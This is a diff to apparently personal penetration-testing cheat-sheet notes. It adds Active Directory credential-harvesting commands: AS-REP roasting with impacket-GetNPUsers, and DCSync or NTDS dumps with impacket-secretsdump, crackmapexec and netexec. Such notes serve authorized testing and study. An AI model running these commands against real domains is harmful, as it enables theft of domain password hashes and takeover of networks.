@@ -57,6 +57,12 @@ Get IP and hostname
 
 ## Inveigh
 
+# ASREP Roasting
+
+`impacket-GetNPUsers [domain/]username[:password] -usersfile users.txt -outputfile out.txt -request -dc-ip DCIP -format hashcat`
+
+Use Kerberos users in wordlist folder, username/pass can be omitted
+
 
 # SSH Tunneling
 
@@ -69,11 +75,15 @@ Set Firefox network settings to use socks5 proxy 127.0.0.1 8080, must remove the
 
 ## DCSYNC
 
-`impacket-secretsdump DOMAIN/user:password@IP -history -outputfile output`
+`impacket-secretsdump DOMAIN/user:password@DCIP -history -outputfile output`
 
 Gets all password history too, useful for identifying patterns
 
+`impacket-secretsdump DOMAIN/user:password@DCIP -history -user-status -outputfile output`
+
 `crackmapexec smb <ip> -u user -p password --ntds`
+
+`nxc smb <ip> -u user -p password --ntds`
 
 ## Other
 
